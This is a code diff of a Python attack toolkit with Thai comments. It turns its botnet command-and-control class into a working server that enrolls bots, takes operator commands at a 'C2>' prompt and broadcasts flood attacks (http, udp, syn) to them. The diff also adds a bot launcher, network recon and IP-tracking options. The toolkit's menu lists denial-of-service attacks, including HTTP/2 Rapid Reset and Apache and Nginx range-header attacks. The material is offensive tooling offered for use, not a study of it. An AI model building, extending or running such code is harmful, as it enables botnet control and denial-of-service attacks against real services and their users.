@@ -2,8 +2,9 @@ import threading  # นำเข้าโมดูล threading สำหรั�
 import socket  # นำเข้าโมดูล socket สำหรับการเชื่อมต่อเครือข่าย
 import asyncio  # นำเข้าโมดูล asyncio สำหรับการทำงานแบบ async
 import os  # นำเข้าโมดูล os สำหรับจัดการไฟล์และระบบปฏิบัติการ
+import time  # นำเข้าโมดูล time สำหรับจัดการเวลา
 from src.config import CONFIG  # นำเข้าการตั้งค่าจาก config
-from src.utils import load_file_lines  # นำเข้าฟังก์ชันโหลดไฟล์
+from src.utils import load_file_lines, add_system_log  # นำเข้าฟังก์ชันโหลดไฟล์
 from src.security import (  # นำเข้าฟังก์ชันความปลอดภัย
     check_system_resources, increment_thread_counter, decrement_thread_counter,
     validate_target, ResourceMonitor
@@ -25,48 +26,128 @@ class BotnetC2:  # คลาสสำหรับเซิร์ฟเวอร�
         self.port = port  # เก็บค่า port
         self.bots = {}  # พจนานุกรมเก็บข้อมูล bots
         self.commands = []  # ลิสต์เก็บคำสั่ง
+        self.logs = [] # Store events for dashboard
+        self.running = False
+
+    def log(self, message):
+        """Add message to logs"""
+        add_system_log(f"[bold yellow]C2:[/] {message}")
+
+    def broadcast(self, message):
+        """Send command to all connected bots"""
+        dead_ids = []
+        for bot_id, client in self.bots.items():
+            try:
+                client.send(message.encode() + b"\n")
+            except:
+                dead_ids.append(bot_id)
+        
+        for dead_id in dead_ids:
+            if dead_id in self.bots:
+                del self.bots[dead_id]
+        
+        if dead_ids:
+            self.log(f"Removed {len(dead_ids)} disconnected bots")
 
     def start_server(self):  # เมธอดเริ่มเซิร์ฟเวอร์
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # สร้าง TCP socket
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # อนุญาตให้ใช้ address ซ้ำ
         server.bind((self.host, self.port))  # ผูก socket กับ host และ port
         server.listen(100)  # ฟังการเชื่อมต่อ (สูงสุด 100)
-        print(f"Botnet C2 server started on {self.host}:{self.port}")  # แสดงข้อความเริ่มเซิร์ฟเวอร์
+        self.running = True
+        self.log(f"🟢 C2 server started on {self.port}")
 
-        while True:  # วนลูปไม่สิ้นสุด
+        while self.running:  # วนลูปไม่สิ้นสุด
             try:  # ลองรับการเชื่อมต่อ
-                client, addr = server.accept()  # รับการเชื่อมต่อจาก client
+                server.settimeout(1.0) # Non-blocking accept
+                try:
+                    client, addr = server.accept()
+                except socket.timeout:
+                    continue
+                
                 bot_id = f"{addr[0]}:{addr[1]}"  # สร้าง ID สำหรับ bot
                 self.bots[bot_id] = client  # เพิ่ม bot เข้าไปในพจนานุกรม
-                print(f"Bot connected: {bot_id}")  # แสดงข้อความ bot เชื่อมต่อ
-                threading.Thread(target=self.handle_bot, args=(client, bot_id)).start()  # เริ่ม thread จัดการ bot
-            except KeyboardInterrupt:  # จัดการ Ctrl+C
-                break  # ออกจากลูป
+                self.log(f"🤖 Bot connected: {bot_id}")
+                threading.Thread(target=self.handle_bot, args=(client, bot_id), daemon=True).start()  # เริ่ม thread จัดการ bot
+            except Exception as e:
+                if self.running:
+                    self.log(f"❌ Server Error: {e}")
+                break
+
+        server.close()
+        self.running = False
+        self.log("🔴 C2 server stopped")
+
+    def command_loop(self):
+        """Interactive command input loop"""
+        while True:
+            try:
+                cmd = input("C2> ").strip()
+                if cmd.lower() in ['quit', 'exit', 'q']:
+                    print("🛑 Stopping C2 server...")
+                    os._exit(0)
+                elif cmd.lower() == 'list':
+                    self.list_bots()
+                elif cmd.lower() == 'help':
+                    self.show_help()
+                elif cmd:
+                    self.send_command(cmd)
+                time.sleep(0.1)
+            except (EOFError, KeyboardInterrupt):
+                break
+
+    def list_bots(self):
+        """List all connected bots"""
+        if not self.bots:
+            print("📭 No bots connected")
+        else:
+            print(f"🤖 Connected bots ({len(self.bots)}):")
+            for bot_id in self.bots.keys():
+                print(f"  • {bot_id}")
+
+    def show_help(self):
+        """Show available commands"""
+        print("Available commands:")
+        print("  info                             - Get system information from all bots")
+        print("  ping                             - Test connectivity with all bots")
+        print("  attack <target> <port> <dur> <met> - Command bots to start an attack")
+        print("                                     methods: http, udp, syn")
+        print("  echo                             - Echo test from all bots")
+        print("  uptime                           - Get uptime from all bots")
+        print("  whoami                           - Get user info from all bots")
+        print("  list                             - List all connected bots")
+        print("  help                             - Show this help")
+        print("  quit                             - Stop C2 server")
 
     def handle_bot(self, client, bot_id):  # เมธอดจัดการ bot แต่ละตัว
-        while True:  # วนลูปไม่สิ้นสุด
+        while self.running:  # วนลูปไม่สิ้นสุด
             try:  # ลองรับข้อมูล
-                data = client.recv(1024)  # รับข้อมูลจาก bot (สูงสุด 1024 ไบต์)
+                client.settimeout(1.0)
+                try:
+                    data = client.recv(1024)
+                except socket.timeout:
+                    continue
+
                 if not data:  # ถ้าไม่มีข้อมูล
                     break  # ออกจากลูป
                 command = data.decode().strip()  # แปลงข้อมูลเป็น string และตัดช่องว่าง
                 if command.startswith("RESULT:"):  # ถ้าเป็นผลลัพธ์
-                    print(f"[{bot_id}] {command}")  # แสดงผลลัพธ์
+                    self.log(f"📩 [{bot_id}] {command[7:]}")
                 elif command == "PING":  # ถ้าเป็น ping
-                    client.send(b"PONG")  # ตอบกลับ pong
+                    client.send(b"PONG\n")  # ตอบกลับ pong
             except:  # จัดการข้อผิดพลาด
                 break  # ออกจากลูป
         if bot_id in self.bots:  # ถ้า bot ยังอยู่ในลิสต์
             del self.bots[bot_id]  # ลบ bot ออกจากลิสต์
         client.close()  # ปิดการเชื่อมต่อ client
-        print(f"Bot disconnected: {bot_id}")  # แสดงข้อความ bot ตัดการเชื่อมต่อ
+        self.log(f"🔌 Bot disconnected: {bot_id}")
 
     def send_command(self, command):  # เมธอดส่งคำสั่งไปยัง bots
         for bot_id, client in self.bots.items():  # วนลูปทุกรายการใน bots
             try:  # ลองส่งคำสั่ง
-                client.send(command.encode())  # ส่งคำสั่งที่เข้ารหัสเป็น bytes
+                client.send(f"{command}\n".encode())  # ส่งคำสั่งที่เข้ารหัสเป็น bytes
             except:  # ถ้าส่งไม่ได้
-                del self.bots[bot_id]  # ลบ bot ที่ส่งไม่ได้ออก
+                pass # Bot will be cleaned up in handle_bot or next loop
 
 
 class Menu:  # คลาสสำหรับระบบเมนู
@@ -89,7 +170,10 @@ class Menu:  # คลาสสำหรับระบบเมนู
         "14": {"name": "HTTP/2 Rapid Reset (CVE-2023-44487)", "func": "http2_rapid_reset", "needs_root": False},  # การโจมตี HTTP/2 Rapid Reset
         "15": {"name": "Apache Range Header DoS", "func": "apache_killer", "needs_root": False},  # การโจมตี Apache Killer
         "16": {"name": "Nginx Range Header DoS", "func": "nginx_range_dos", "needs_root": False},  # การโจมตี Nginx Range DoS
-        "17": {"name": "Port Scanner", "func": "port_scanner", "needs_root": False}  # เครื่องมือสแกนพอร์ต
+        "17": {"name": "Port Scanner", "func": "port_scanner", "needs_root": False},  # เครื่องมือสแกนพอร์ต
+        "18": {"name": "Launch Local Bot Client", "func": "launch_bot", "needs_root": False}, # เปิดบอทเชื่อมต่อ C2
+        "20": {"name": "Local Network Recon (IP/Port/Status)", "func": "network_scanner", "needs_root": False},
+        "21": {"name": "IP-Tracker (Deep OSINT Intel)", "func": "ip_tracker", "needs_root": False}
     }
 
     @staticmethod  # decorator สำหรับเมธอด static
@@ -192,11 +276,14 @@ class AttackDispatcher:  # คลาสสำหรับจัดการก�
         # Special cases  # สำหรับกรณีพิเศษ
         if choice == "7":  # ถ้าเลือก C2 server
             c2 = BotnetC2(port=params["c2_port"])  # สร้างออบเจ็กต์ C2
-            try:  # ลองเริ่มเซิร์ฟเวอร์
-                c2.start_server()  # เริ่มเซิร์ฟเวอร์ C2
-            except KeyboardInterrupt:  # จัดการ Ctrl+C
-                print("C2 server stopped")  # แสดงข้อความหยุดเซิร์ฟเวอร์
-            return  # ออกจากฟังก์ชัน
+            threading.Thread(target=c2.start_server, daemon=True).start()  # เริ่มเซิร์ฟเวอร์ในพื้นหลัง
+            return c2  # Return the instance instead of blocking
+
+        if choice == "18": # Launch Local Bot
+            from bot import FullBot
+            bot = FullBot(params['c2_host'], params['c2_port'])
+            threading.Thread(target=bot.run, kwargs={'interactive': False}, daemon=True).start()
+            return bot
 
         # Prepare target URL/IP  # สำหรับเตรียมเป้าหมาย
         target = params["target"]  # รับค่าเป้าหมาย
@@ -207,6 +294,8 @@ class AttackDispatcher:  # คลาสสำหรับจัดการก�
         max_requests = params.get("max_requests", 0)  # รับค่าจำนวนการยิงสูงสุด
 
         # Execute attack  # สำหรับดำเนินการโจมตี
+        add_system_log(f"[bold red]LAUNCHING:[/] {attack_info['name']} against {target}")
+        
         if choice == "1":  # ถ้าเลือก HTTP Flood พื้นฐาน
             url = target if target.startswith("http") else f"http://{target}"  # เตรียม URL
             for _ in range(threads):  # วนลูปตามจำนวนเธรด
@@ -267,3 +356,11 @@ class AttackDispatcher:  # คลาสสำหรับจัดการก�
 
         elif choice == "17":  # Port Scanner
             port_scanner(target, params["ports"], threads)
+
+        elif choice == "20":  # Local Network Recon
+            from attacks import network_scanner
+            network_scanner(threads, params.get("subnet"))
+
+        elif choice == "21": # IP Tracker
+            from utils import ip_tracker
+            ip_tracker(params.get("ip"))
